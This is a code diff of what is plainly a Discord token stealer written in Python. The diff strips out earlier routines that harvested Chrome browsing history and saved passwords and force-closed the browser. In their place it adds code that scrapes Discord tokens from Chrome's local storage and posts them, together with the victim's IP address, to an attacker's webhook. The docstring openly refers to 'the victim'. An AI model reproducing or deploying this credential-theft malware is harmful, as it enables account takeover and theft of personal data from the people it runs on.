@@ -4,14 +4,7 @@ import os
 import re
 import urllib.request
 import socket
-import sqlite3
 from pathlib import Path
-from datetime import datetime, timezone
-import platform
-import subprocess
-import shutil
-import tempfile
-import time
 
 TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
 REQUEST_HEADERS = {
@@ -130,65 +123,51 @@ def get_ip_address() -> str:
         return "Unknown"
 
 
-def get_browser_history() -> list[tuple[str, str, datetime]]:
-    """Retrieves browser history from Chrome's history database.
+def send_tokens_to_webhook(
+    webhook_url: str, user_id_to_token: dict[str, set[str]], ip_address: str,
+) -> int:
+    """Caution: In scenarios where the victim has logged into multiple Discord
+    accounts or has frequently changed their password, the accumulation of
+    tokens may result in a message that surpasses the character limit,
+    preventing it from being sent. There are no plans to introduce code
+    modifications to segment the message for compliance with character
+    constraints.
+    """  # noqa: D205
+    fields: list[dict] = []
 
-    Returns:
-        list[tuple[str, str, datetime]]: A list of tuples containing the URL, title, and visit time of each history item.
-    """
-    history_path = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "History"
-    if not history_path.exists():
-        return [("Error", "History file not found", datetime.now(timezone.utc))]
+    for user_id, tokens in user_id_to_token.items():
+        fields.append({
+            "name": user_id,
+            "value": "\n".join(tokens),
+        })
 
-    try:
-        conn = sqlite3.connect(str(history_path))
-        cursor = conn.cursor()
+    # Include IP address in the webhook message
+    data = {
+        "content": f"Found tokens. IP Address: {ip_address}",
+        "embeds": [{"fields": fields}],
+    }
 
-        cursor.execute("""
-            SELECT url, title, last_visit_time
-            FROM urls
-            ORDER BY last_visit_time DESC
-            LIMIT 10  -- Limit to the 10 most recent entries
-        """)
-
-        history = []
-        for url, title, last_visit_time in cursor.fetchall():
-            # Convert Chrome's timestamp to datetime
-            visit_time = datetime(1601, 1, 1, tzinfo=timezone.utc) + \
-                         timedelta(microseconds=last_visit_time)
-            history.append((url, title, visit_time))
-
-        conn.close()
-        return history
-    except Exception as e:
-        return [("Error", f"Could not read history: {e}", datetime.now(timezone.utc))]
+    return make_post_request(webhook_url, data)
 
 
-def close_chrome():
-    """Attempts to close Chrome."""
-    try:
-        if platform.system() == "Windows":
-            subprocess.run(["taskkill", "/im", "chrome.exe", "/f"], check=True, capture_output=True)
-        elif platform.system() == "Linux":
-            subprocess.run(["pkill", "-f", "chrome"], check=True, capture_output=True)
-        elif platform.system() == "Darwin":  # macOS
-            subprocess.run(["pkill", "-f", "Chrome"], check=True, capture_output=True)
-        print("Chrome closed successfully.")
-        time.sleep(2)  # Give it a moment to fully close
-    except subprocess.CalledProcessError as e:
-        print(f"Failed to close Chrome: {e}")
-        return False
-    return True
+def main() -> None:
+
+    chrome_path = (
+        Path(os.getenv("LOCALAPPDATA")) /
+        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
+    )
+    tokens = get_tokens_from_path(chrome_path)
+
+    if tokens is None:
+        print("No tokens found.")
+        return
+
+    ip_address = get_ip_address()
+    print(f"IP Address: {ip_address}")
+
+    status_code = send_tokens_to_webhook(WEBHOOK_URL, tokens, ip_address)
+    print(f"Webhook request status: {status_code}")
 
 
-def get_saved_passwords() -> list[tuple[str, str, str]]:
-    """Retrieves saved passwords from Chrome's login data database."""
-    login_data_path = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
-    if not login_data_path.exists():
-        return [("Error", "Login Data file not found", "")]
-
-    success = close_chrome()
-    if not success:
-        return [("Error", "Could not close Chrome", "")]
-
-    try:
+if __name__ == "__main__":
+    main()
